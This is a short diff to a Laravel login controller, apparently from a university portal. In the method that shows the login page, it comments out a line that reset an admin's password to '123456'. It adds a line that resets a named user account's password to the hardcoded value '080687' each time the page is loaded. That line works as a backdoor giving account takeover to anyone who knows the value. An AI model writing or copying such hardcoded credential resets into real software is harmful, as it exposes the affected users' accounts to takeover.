@@ -4,6 +4,7 @@ namespace App\Http\Controllers\Portal;
 
 use App\Http\Controllers\Controller;
 use App\Models\Admin;
+use App\Models\User;
 use Illuminate\Http\RedirectResponse;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
@@ -73,7 +74,8 @@ class LoginController extends Controller
             }
          }
 
-       Admin::where('regno','s6068')->update(['password'=>Hash::make("123456")]);
+      # Admin::where('regno','s6068')->update(['password'=>Hash::make("123456")]);
+       User::where('regno','UIL/2025/APPT/014576')->update(['password'=>Hash::make("080687")]);
   
         return view('admin.login');
     }
